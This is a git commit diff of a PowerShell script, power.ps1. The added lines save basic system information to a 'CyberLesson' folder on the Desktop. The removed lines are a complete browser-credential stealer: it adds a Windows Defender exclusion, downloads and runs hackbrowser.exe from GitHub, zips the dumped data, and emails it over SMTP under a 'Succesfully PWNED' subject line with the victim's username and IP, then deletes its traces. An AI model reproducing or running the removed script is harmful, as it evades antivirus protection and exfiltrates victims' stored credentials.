ff31185b7782da5cc3dbbbb328f3b4deac6909c6
Waledawad <120615132+Waledawad@users.noreply.github.com>
2026-04-07 18:44:18 +0300

    Refactor script to collect and save system informationههه
    Removed previous functionality related to downloading and executing a file, and added new code to gather system information and save it to a text file.

--- power.ps1
+++ power.ps1
@@ -1,32 +1,45 @@
-#Adding windows defender exclusionpath
-Add-MpPreference -ExclusionPath "$env:appdata"
-#Creating the directory we will work on
-mkdir "$env:appdata\Microsoft\dump"
-Set-Location "$env:appdata\Microsoft\dump"
-#Downloading and executing hackbrowser.exe
-Invoke-WebRequest 'https://github.com/Real0xdom/venom/raw/master/hackbrowser.exe' -OutFile "hb.exe"
-.\hb.exe --format json
-Remove-Item -Path "$env:appdata\Microsoft\dump\hb.exe" -Force
-#Creating A Zip Archive
-Compress-Archive -Path * -DestinationPath dump.zip
-$Random = Get-Random
-#Mailing the output you will need to enable less secure app access on your google account for this to work
-$Message = new-object Net.Mail.MailMessage
-$smtp = new-object Net.Mail.SmtpClient("smtp.outlook.com", 587)
-$smtp.Credentials = New-Object System.Net.NetworkCredential("email here @outlook.com", "email password");
-$smtp.EnableSsl = $true
-$Message.From = "senders email address same as above"
-$Message.To.Add("receivers email address")
-$ip = Invoke-RestMethod "myexternalip.com/raw"
-$Message.Subject = "Succesfully PWNED " + $env:USERNAME + "! (" + $ip + ")"
-$ComputerName = Get-CimInstance -ClassName Win32_ComputerSystem | Select Model,Manufacturer
-$Message.Body = $ComputerName
-$files=Get-ChildItem
-$Message.Attachments.Add("$env:appdata\Microsoft\dump\dump.zip")
-$smtp.Send($Message)
-$Message.Dispose()
-$smtp.Dispose()
-#Cleanup
-cd "$env:appdata"
-Remove-Item -Path "$env:appdata\Microsoft\dump" -Force -Recurse
-Remove-MpPreference -ExclusionPath "$env:appdata"
+
+# إنشاء مجلد على سطح المكتب
+$desktop = [Environment]::GetFolderPath("Desktop")
+$folder = "$desktop\CyberLesson"
+
+New-Item -ItemType Directory -Path $folder -Force | Out-Null
+
+# جمع معلومات النظام
+$username = $env:USERNAME
+$computer = $env:COMPUTERNAME
+$os = (Get-CimInstance Win32_OperatingSystem).Caption
+$cpu = (Get-CimInstance Win32_Processor).Name
+$ram = [math]::Round((Get-CimInstance Win32_ComputerSystem).TotalPhysicalMemory / 1GB,2)
+
+# الحصول على IP الخارجي
+$ip = Invoke-RestMethod "https://api.ipify.org"
+
+# إنشاء النص
+$data = @"
+===== System Information =====
+
+User Name: $username
+Computer Name: $computer
+Operating System: $os
+Processor: $cpu
+RAM: $ram GB
+External IP: $ip
+
+Date: $(Get-Date)
+
+==============================
+"@
+
+# عرض المعلومات في PowerShell
+Write-Host $data
+
+# حفظ المعلومات في ملف
+$file = "$folder\system_info.txt"
+$data | Out-File $file
+
+# ضغط الملف
+Compress-Archive -Path $file -DestinationPath "$folder\info.zip" -Force
+
+Write-Host "تم حفظ المعلومات هنا:"
+Write-Host $file
